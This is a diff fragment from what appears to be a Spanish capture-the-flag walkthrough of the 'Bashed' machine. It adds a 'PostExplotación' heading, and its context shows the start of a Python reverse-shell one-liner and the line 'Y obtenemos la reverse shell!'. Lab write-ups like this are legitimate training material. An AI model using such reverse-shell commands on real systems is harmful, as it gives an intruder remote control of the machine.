@@ -113,3 +113,6 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 **Y obtenemos la reverse shell!**
 
 ![shell.jpg]({{site.baseurl}}/images/Bashed/shell.jpg)
+
+# PostExplotación
+
